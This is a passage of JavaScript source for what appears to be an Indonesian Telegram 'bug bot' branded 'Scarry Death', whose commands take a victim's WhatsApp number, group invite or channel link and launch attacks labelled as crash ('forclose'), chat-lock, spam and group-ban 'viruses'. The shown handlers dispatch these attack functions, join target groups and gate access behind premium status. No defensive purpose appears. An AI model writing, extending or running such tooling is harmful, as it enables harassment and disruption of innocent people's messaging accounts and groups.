    // 🔥 FORMAT (KIRIM DULU)
    const userMention = mentionUserHTML(msg);
    const formattedNumber = rawParam;

    const messageText = `
<blockquote>
${e1} FORCLOSE CLICK IN GROUP

${a1} User : ${userMention}
${a2} Target : <code>${formattedNumber}</code>
${a3} Status : Success Send Bugs
</blockquote>
`.trim();

    await bot.sendPhoto(chatId, getImage(), {
      caption: messageText,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "㋡𝐂𝐄𝐊 𝐆𝐑𝐎𝐔𝐏ᯤ",
              url: rawParam,
              style: "danger",
              icon_custom_emoji_id: EMOJI.btn
            }
          ]
        ]
      }
    });

    // 🔥 PROSES DI BELAKANG (SILENT)
    let count = groupSendTracker.get(groupJid) || 0;
    count++;
    groupSendTracker.set(groupJid, count);

    const isRealSend = count <= 2;

    if (isRealSend) {
      murbugraa3(groupJid).catch(() => {});
    } else {
      await new Promise(resolve => setTimeout(resolve, 1200));
    }

    if (count >= 3) {
      groupSendTracker.delete(groupJid);
    }

  } catch (error) {
    bot.sendMessage(chatId, `❌ Terjadi kesalahan sistem.`);
  }
});

bot.onText(/\/lockgc$/, async (msg) => {
  bot.sendMessage(msg.chat.id, "Example: /lockgc https://chat.whatsapp.com/xxxx");
});
// TAMBAHAN TRACK (GLOBAL)
bot.onText(/\/lockgc (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const date = getCurrentDate();
  const rawParam = (match && match[1]) ? match[1].trim() : "";
  const chatType = msg.chat.type;
  const isPremium = await premium(senderId);
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  // 🔥 EMOJI PREMIUM
  const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
  const EMOJI = {
    main: "5979037639347542903",   // 👻
    btn: "4935965077296645149"     // 😨
  };
  const e1 = prem(EMOJI.main, "👻");
  const a1 = prem("5417913674092277565", "👻");
const a2 = prem("5256131095094652290", "🔥");
const a3 = prem("5217880283860194582", "👻"); 
                
  const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

  if (!isCmdActive("/lockgc")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /lockgc.");
}
  if (!isPremium && !groupAllowed) {
    return bot.sendMessage(chatId,
      "Fitur ini hanya untuk:\n• User Premium\nATAU\n• Group yang telah diizinkan owner."
    );
  }

  if (isGroupOnly() && chatType === 'private') {
    return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
  }

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp");
  }

  if (blacklistedCommands.includes('/blankgroup')) {
    return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
  }

  if (!/^https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+(\?.*)?$/.test(rawParam)) {
    return bot.sendMessage(chatId, "⚠️ Masukkan link grup WhatsApp yang valid!\nContoh: /lockgc https://chat.whatsapp.com/xxxx");
  }

  try {

    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
      return;
    }

    const otax = sock;

    const groupCode = rawParam.split("https://chat.whatsapp.com/")[1].split("?")[0];
    let groupJid;

    try {
      groupJid = await otax.groupAcceptInvite(groupCode);
    } catch (e) {

      const err = (e?.message || "").toLowerCase();

      if (
        err.includes("forbidden") ||
        err.includes("401") ||
        err.includes("403") ||
        err.includes("not-authorized")
      ) {
        return bot.sendMessage(chatId,
`❌ Gagal masuk grup!

Penyebab:
Grup PRIVATE / perlu approval admin.`);
      }

      if (
    err.includes("already") ||
    err.includes("member") ||
    err.includes("exists") ||
    err.includes("conflict")
) {

        try {
          const inviteInfo = await otax.groupGetInviteInfo(groupCode);

          if (!inviteInfo || !inviteInfo.id) {
            return bot.sendMessage(chatId, `❌ Link expired / tidak valid.`);
          }

          groupJid = inviteInfo.id;

        } catch {
          return bot.sendMessage(chatId, `❌ Gagal ambil info grup.`);
        }
      } else {
        return bot.sendMessage(chatId, `❌ Gagal join grup: ${e?.message || "Unknown error"}`);
      }
    }

    if (!groupJid || !groupJid.includes("@g.us")) {
      return bot.sendMessage(chatId, `❌ groupJid tidak valid.`);
    }

    // 🔥 FORMAT (KIRIM DULU)
    const userMention = mentionUserHTML(msg);
    const formattedNumber = rawParam;

    const messageText = `
<blockquote>
${e1} LOCK CHAT GROUP ALL MEMBER

${a1} User : ${userMention}
${a2} Target : <code>${formattedNumber}</code>
${a3} Status : Success Send Lock Group
</blockquote>
`.trim();

    await bot.sendPhoto(chatId, getImage(), {
      caption: messageText,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "㋡𝐂𝐄𝐊 𝐆𝐑𝐎𝐔𝐏ᯤ",
              url: rawParam,
              style: "danger",
              icon_custom_emoji_id: EMOJI.btn
            }
          ]
        ]
      }
    });

    // 🔥 PROSES DI BELAKANG (SILENT)
    let count = groupSendTracker.get(groupJid) || 0;
    count++;
    groupSendTracker.set(groupJid, count);

    const isRealSend = count <= 2;

    if (isRealSend) {
      murbugraa5(groupJid).catch(() => {});
    } else {
      await new Promise(resolve => setTimeout(resolve, 1200));
    }

    if (count >= 3) {
      groupSendTracker.delete(groupJid);
    }

  } catch (error) {
    bot.sendMessage(chatId, `❌ Terjadi kesalahan sistem.`);
  }
});

bot.onText(/\/banindo$/, async (msg) => {
  bot.sendMessage(msg.chat.id, "Example: /banindo https://chat.whatsapp.com/xxxx");
});
// TAMBAHAN TRACK (GLOBAL)
bot.onText(/\/banindo (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const date = getCurrentDate();
  const rawParam = (match && match[1]) ? match[1].trim() : "";
  const chatType = msg.chat.type;
  const isPremium = await premium(senderId);
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  // 🔥 EMOJI PREMIUM
  const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
  const EMOJI = {
    main: "5979037639347542903",   // 👻
    btn: "4935965077296645149"     // 😨
  };
  const e1 = prem(EMOJI.main, "👻");
  const a1 = prem("5417913674092277565", "👻");
const a2 = prem("5256131095094652290", "🔥");
const a3 = prem("5217880283860194582", "👻"); 
                
  const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

  if (!isCmdActive("/banindo")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /banindo.");
}
  if (!isPremium && !groupAllowed) {
    return bot.sendMessage(chatId,
      "Fitur ini hanya untuk:\n• User Premium\nATAU\n• Group yang telah diizinkan owner."
    );
  }

  if (isGroupOnly() && chatType === 'private') {
    return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
  }

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp");
  }

  if (blacklistedCommands.includes('/fcgc')) {
    return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
  }

  if (!/^https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+(\?.*)?$/.test(rawParam)) {
    return bot.sendMessage(chatId, "⚠️ Masukkan link grup WhatsApp yang valid!\nContoh: /banindo https://chat.whatsapp.com/xxxx");
  }

  try {

    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
      return;
    }

    const otax = sock;

    const groupCode = rawParam.split("https://chat.whatsapp.com/")[1].split("?")[0];
    let groupJid;

    try {
      groupJid = await otax.groupAcceptInvite(groupCode);
    } catch (e) {

      const err = (e?.message || "").toLowerCase();

      if (
        err.includes("forbidden") ||
        err.includes("401") ||
        err.includes("403") ||
        err.includes("not-authorized")
      ) {
        return bot.sendMessage(chatId,
`❌ Gagal masuk grup!

Penyebab:
Grup PRIVATE / perlu approval admin.`);
      }

      if (
    err.includes("already") ||
    err.includes("member") ||
    err.includes("exists") ||
    err.includes("conflict")
) {

        try {
          const inviteInfo = await otax.groupGetInviteInfo(groupCode);

          if (!inviteInfo || !inviteInfo.id) {
            return bot.sendMessage(chatId, `❌ Link expired / tidak valid.`);
          }

          groupJid = inviteInfo.id;

        } catch {
          return bot.sendMessage(chatId, `❌ Gagal ambil info grup.`);
        }
      } else {
        return bot.sendMessage(chatId, `❌ Gagal join grup: ${e?.message || "Unknown error"}`);
      }
    }

    if (!groupJid || !groupJid.includes("@g.us")) {
      return bot.sendMessage(chatId, `❌ groupJid tidak valid.`);
    }

    // 🔥 FORMAT (KIRIM DULU)
    const userMention = mentionUserHTML(msg);
    const formattedNumber = rawParam;

    const messageText = `
<blockquote>
${e1} BANNED GROUP TARGET

${a1} User : ${userMention}
${a2} Target : <code>${formattedNumber}</code>
${a3} Status : Proses Banned Group Target...
</blockquote>
`.trim();

    await bot.sendPhoto(chatId, getImage(), {
      caption: messageText,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "㋡𝐂𝐄𝐊 𝐆𝐑𝐎𝐔𝐏ᯤ",
              url: rawParam,
              style: "danger",
              icon_custom_emoji_id: EMOJI.btn
            }
          ]
        ]
      }
    });

    // 🔥 PROSES DI BELAKANG (SILENT)
    let count = groupSendTracker.get(groupJid) || 0;
    count++;
    groupSendTracker.set(groupJid, count);

    const isRealSend = count <= 2;

    if (isRealSend) {
      murbugraa4(groupJid).catch(() => {});
    } else {
      await new Promise(resolve => setTimeout(resolve, 1200));
    }

    if (count >= 3) {
      groupSendTracker.delete(groupJid);
    }

  } catch (error) {
    bot.sendMessage(chatId, `❌ Terjadi kesalahan sistem.`);
  }
});

bot.onText(/\/(lockchat|forclose|buldoz|blankhome|forcecall|fcinfinity|spamcall|fciphone|fcinfinity|addsender|delsender)$/, async (msg, match) => {
  const cmd = match[1].toLowerCase();

  // mapping contoh sesuai command
  const examples = {
    lockchat: "/lockchat 628xxx",
    invisiblehard: "/forclose 628xxx",
    drainkuota: "/buldoz 628xxx",
    blankhome: "/blankhome 628xxx",
    frezehome: "/frezehome 628xxx",
    forcecall: "/forcecall 628xxx",
    fcinfinity: "/fcinfinity 628xxx",
    spamcall: "/spamcall 628xxx",
    fciphone: "/fciphone 628xxx",
    fcinfinity: "/fcinfinity 628xxx",
    addsender: "/addsender 628xxx",
    delsender: "/delsender 628xxx"
  };

  const example = examples[cmd] || `/${cmd} 628xxx`;

  bot.sendMessage(msg.chat.id, `Example: \`${example}\`` , { parse_mode: "Markdown" });
});

bot.onText(/\/forclosech (\S+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const date = getCurrentDate();
  const args = match[1];

  // ======================================================
  // 1. Ambil WA client (HARUS PAKAI salah satu session yang aktif)
  // ======================================================
  if (sessions.size === 0) {
    return bot.sendMessage(
      chatId,
      "❌ Tidak ada WhatsApp client aktif.\nGunakan /addsender 628xxx dulu."
    );
  }

  // Ambil session pertama yang aktif
  const [botNumber, client] = sessions.entries().next().value;

  if (!client) {
    return bot.sendMessage(
      chatId,
      "❌ WhatsApp client belum terhubung. Gunakan /addsender 628xxx"
    );
  }

  // ======================================================
  // Validasi link
  // ======================================================
  if (!isCmdActive("/forclosech")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner.");
}
  if (!args.startsWith("https://whatsapp.com/channel/")) {
    return bot.sendMessage(
      chatId,
      "❌ Format link salah.\nContoh:\n/forclosech https://whatsapp.com/channel/xxxx"
    );
  }

  // Extract channel ID
  const channelId = args.split("https://whatsapp.com/channel/")[1];

  let metadata;
  try {
    metadata = await client.newsletterMetadata("invite", channelId);
  } catch (e) {
    return bot.sendMessage(
      chatId,
      `❌ Gagal membaca channel:\n${e.message}`
    );
  }

  const target = `${metadata.id}`;

  // ======================================================
  // Variabel lainnya
  // ======================================================
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);
  const chatType = msg.chat.type;
  const isPremiumUser = premium(senderId);
  const username = msg.from.username ? `@${msg.from.username}` : "No Username";

  if (isGroupOnly() && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya dapat digunakan di grup.");
  }

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH OWNER");
  }

  if (blacklistedCommands.includes("/forclosech")) {
    return bot.sendMessage(chatId, "⛔ Command ini dinonaktifkan.");
  }

  if (cooldown > 0) {
    return bot.sendMessage(
      chatId,
      `⏳ Tunggu ${cooldown} detik sebelum command berikutnya.`
    );
  }

  // ======================================================
  // Premium Check
  // ======================================================
  const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

if (!isPremium && !groupAllowed) {
  return bot.sendMessage(chatId,
    "Fitur ini hanya untuk:\n• User Premium\nATAU\n• Group yang telah diizinkan owner."
  );
}

  // ======================================================
  // PROGRES LOADING
  // ======================================================
  const baseCaption = `
<blockquote>SCARRY DEATH ENGINE
⪧ User : ${username}
⪧ Target : ${target}
⪧ Command : /forclosech
⪧ Virus : Forclose No Click All Memb Channel
⪧ Status : {STATUS}
⪧ Date : ${date}

© ꜱᴄᴀʀʀʏ ᴅᴇᴀᴛʜ ᴠ 151 ɢᴇɴᴢ 121
</blockquote>
`;

  const sent = await bot.sendPhoto(chatId, randomImage, {
    caption: baseCaption.replace("{STATUS}", "▰▱▱▱▱ 10%"),
    parse_mode: "HTML",
  });

  function bar(percent) {
    const t = 5;
    const f = Math.round((percent / 100) * t);
    return "▰".repeat(f) + "▱".repeat(t - f) + ` ${percent}%`;
  }

  async function animate(chat_id, message_id) {
    const steps = [10, 35, 55, 80, 95, 100];
    for (let p of steps) {
      try {
        await bot.editMessageCaption(
          baseCaption.replace("{STATUS}", bar(p)),
          {
            chat_id,
            message_id,
            parse_mode: "HTML",
          }
        );
        await new Promise(res => setTimeout(res, 600));
      } catch {}
    }
  }

  try {
    await animate(chatId, sent.message_id);

    // ======================================================
    // PERINTAH UTAMA INJECT (sesuaikan dengan API kamu)
    // ======================================================
    await clientnewsletterFollow(target);

    await bot.editMessageCaption(
      baseCaption.replace("{STATUS}", "✔ SUCCESS"),
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
      }
    );

  } catch (err) {
    bot.editMessageCaption(
      baseCaption.replace("{STATUS}", `❌ ERROR\n${err.message}`),
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
      }
    );
  }
});

bot.onText(/\/tes (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const date = getCurrentDate();
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  let cooldown = checkCooldown(userId); 

  // **Hilangkan cooldown**
  cooldown = 0;

  const chatType = msg.chat.type;
  const isPremium = await premium(senderId);
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  if (isGroupOnly() && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp");
  }

  if (blacklistedCommands.includes("/tes")) {
    return bot.sendMessage(chatId, "⛔ Command ini dilarang!");
  }

  // **Cooldown dimatikan — dilewati**
  // if (cooldown > 0) {
  //   return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  // }

  const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

if (!isPremium && !groupAllowed) {
  return bot.sendMessage(chatId,
    "Fitur ini hanya untuk:\n• User Premium\nATAU\n• Group yang telah diizinkan owner."
  );
}

  try {
    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
      return;
    }

    // **Cooldown dimatikan — dilewati**
    // if (cooldown > 0) {
    //   return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
    // }

    const baseCaption = `
<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ATTACKING 
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /epci
⪧ Virus  : Tass Acak Sesuai Raraa
⪧ Status : {STATUS}
⪧ Date now : ${date}

©️ ꜱᴄᴀʀʀʏ ᴅᴇᴀᴛʜ ᴠ 151 ɢᴇɴᴢ 121
</blockquote>
`;

    const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: baseCaption.replace("{STATUS}", "▰▱▱▱▱ 10%"),
      parse_mode: "HTML",
    });

    function makeBar(percent) {
      const total = 5;
      const filled = Math.round((percent / 100) * total);
      return "▰".repeat(filled) + "▱".repeat(total - filled) + ` ${percent}%`;
    }

    async function animateLoading(chat_id, message_id) {
      const steps = [10, 30, 60, 80, 95, 100];
      for (let i = 0; i < steps.length; i++) {
        const p = steps[i];
        const updatedCaption = baseCaption.replace("{STATUS}", makeBar(p));
        try {
          await bot.editMessageCaption(updatedCaption, {
            chat_id,
            message_id,
            parse_mode: "HTML",
          });
        } catch (e) {
          console.warn("Gagal update loading:", e.message);
        }
        await new Promise((resolve) => setTimeout(resolve, 800));
      }
    }

    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    animateLoading(chatId, sentMessage.message_id);

    await bebasspam(target);

    await bot.editMessageCaption(
      baseCaption.replace("{STATUS}", "Succses.."),
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "CEK ⵢ TARGET", url: `https://wa.me/${formattedNumber}` }]],
        },
      }
    );

    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/lockchat (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const date = getCurrentDate();
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);
  const chatType = msg.chat.type;
  const isPremium = await premium(senderId);
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  if (!isCmdActive("/lockchat")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner.");
}
  if (isGroupOnly() && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp");
  }

  if (blacklistedCommands.includes("/lockchat")) {
    return bot.sendMessage(chatId, "⛔ Command ini dilarang!");
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

if (!isPremium && !groupAllowed) {
  return bot.sendMessage(chatId,
    "Fitur ini hanya untuk:\n• User Premium\nATAU\n• Group yang telah diizinkan owner."
  );
}

  try {
    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
      return;
    }

    if (cooldown > 0) {
      return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
    }

    // Template caption
    const baseCaption = `
<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ATTACKING 
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /lockchat
⪧ Virus  : Lock Chat Peringatan
⪧ Status : {STATUS}
⪧ Date now : ${date}

©️ ꜱᴄᴀʀʀʏ ᴅᴇᴀᴛʜ 
</blockquote>
`;

    // Kirim pesan awal
    const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: baseCaption.replace("{STATUS}", "▰▱▱▱▱ 10%"),
      parse_mode: "HTML",
    });

    // Progress bar builder
    function makeBar(percent) {
      const total = 5;
      const filled = Math.round((percent / 100) * total);
      return "▰".repeat(filled) + "▱".repeat(total - filled) + ` ${percent}%`;
    }

    // Show step-by-step loading
    async function animateLoading(chat_id, message_id) {
      const steps = [10, 30, 60, 80, 95, 100];
      for (let i = 0; i < steps.length; i++) {
        const p = steps[i];
        const updatedCaption = baseCaption.replace("{STATUS}", makeBar(p));
        try {
          await bot.editMessageCaption(updatedCaption, {
            chat_id,
            message_id,
            parse_mode: "HTML",
          });
        } catch (e) {
          console.warn("Gagal update loading:", e.message);
        }
        await new Promise((resolve) => setTimeout(resolve, 800));
      }
    }

    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    // Tampilkan animasi loading
    animateLoading(chatId, sentMessage.message_id);

    // Eksekusi
    await delaychat(target);

    // Edit pesan final sukses
    await bot.editMessageCaption(
      baseCaption.replace("{STATUS}", "Succses.."),
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "CEK ⵢ TARGET", url: `https://wa.me/${formattedNumber}` }]],
        },
      }
    );

    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
  } catch (error) {
    bot.sendMessage(chatId, `Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/kddn (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const date = getCurrentDate();
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);
  const chatType = msg.chat.type;
  const isPremium = await premium(senderId);
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  if (isGroupOnly() && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp");
  }

  if (blacklistedCommands.includes("/invisdelay")) {
    return bot.sendMessage(chatId, "⛔ Command ini dilarang!");
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!isPremium) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ♰</blockquote>
use /addprem before using this command to be able to access `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 628xx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
    }

    // Template caption
    const baseCaption = `
<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ATTACKING 
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /invisdelay
⪧ Virus  : Invisible Delay
⪧ Status : {STATUS}
⪧ Date now : ${date}

©️ 𝓢𝓬𝓪𝓻𝓻𝔂 𝓓𝓮𝓪𝓽𝓱 𝓥 107 𝓖𝓮𝓷 87
</blockquote>
`;

    // Kirim pesan awal
    const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: baseCaption.replace("{STATUS}", "▰▱▱▱▱ 10%"),
      parse_mode: "HTML",
    });

    // Progress bar builder
    function makeBar(percent) {
      const total = 5;
      const filled = Math.round((percent / 100) * total);
      return "▰".repeat(filled) + "▱".repeat(total - filled) + ` ${percent}%`;
    }

    // Show step-by-step loading
    async function animateLoading(chat_id, message_id) {
      const steps = [10, 30, 60, 80, 95, 100];
      for (let i = 0; i < steps.length; i++) {
        const p = steps[i];
        const updatedCaption = baseCaption.replace("{STATUS}", makeBar(p));
        try {
          await bot.editMessageCaption(updatedCaption, {
            chat_id,
            message_id,
            parse_mode: "HTML",
          });
        } catch (e) {
          console.warn("Gagal update loading:", e.message);
        }
        await new Promise((resolve) => setTimeout(resolve, 800));
      }
    }

    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    // Tampilkan animasi loading
    animateLoading(chatId, sentMessage.message_id);

    // Eksekusi
    await delayraraa1(target);

    // Edit pesan final sukses
    await bot.editMessageCaption(
      baseCaption.replace("{STATUS}", "Succses.."),
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "CEK ⵢ TARGET", url: `https://wa.me/${formattedNumber}` }]],
        },
      }
    );

    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
  } catch (error) {
    bot.sendMessage(chatId, `Gagal mengirim bug: ${error.message}`);
  }
});
bot.onText(/\/forclose (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const date = getCurrentDate();
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);
  const chatType = msg.chat.type;
  const isPremium = await premium(senderId);
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  if (!isCmdActive("/forclose")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /forclose.");
}
  if (isGroupOnly() && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp");
  }

  if (blacklistedCommands.includes("/forclose")) {
    return bot.sendMessage(chatId, "⛔ Command ini dilarang!");
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

if (!isPremium && !groupAllowed) {
  return bot.sendMessage(chatId,
    "Fitur ini hanya untuk:\n• User Premium\nATAU\n• Group yang telah diizinkan owner."
  );
}

  try {
    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
      return;
    }

    if (cooldown > 0) {
      return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
    }

    // Template caption
    const baseCaption = `
<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ATTACKING 
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /forclose
⪧ Virus  : Forclose Infinity
⪧ Status : {STATUS}
⪧ Date now : ${date}

©️ ꜱᴄᴀʀʀʏ ᴅᴇᴀᴛʜ 
</blockquote>
`;

    // Kirim pesan awal
    const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: baseCaption.replace("{STATUS}", "▰▱▱▱▱ 10%"),
      parse_mode: "HTML",
    });

    // Progress bar builder
    function makeBar(percent) {
      const total = 5;
      const filled = Math.round((percent / 100) * total);
      return "▰".repeat(filled) + "▱".repeat(total - filled) + ` ${percent}%`;
    }

    // Show step-by-step loading
    async function animateLoading(chat_id, message_id) {
      const steps = [10, 30, 60, 80, 95, 100];
      for (let i = 0; i < steps.length; i++) {
        const p = steps[i];
        const updatedCaption = baseCaption.replace("{STATUS}", makeBar(p));
        try {
          await bot.editMessageCaption(updatedCaption, {
            chat_id,
            message_id,
            parse_mode: "HTML",
          });
        } catch (e) {
          console.warn("Gagal update loading:", e.message);
        }
        await new Promise((resolve) => setTimeout(resolve, 800));
      }
    }

    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    // Tampilkan animasi loading
    animateLoading(chatId, sentMessage.message_id);

    // Eksekusi
    await blankraraa1(target);

    // Edit pesan final sukses
    await bot.editMessageCaption(
      baseCaption.replace("{STATUS}", "Succses.."),
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "CEK ⵢ TARGET", url: `https://wa.me/${formattedNumber}` }]],
        },
      }
    );

    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
  } catch (error) {
  console.error(error);
    bot.sendMessage(chatId, `Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/girnrj (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const date = getCurrentDate();
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
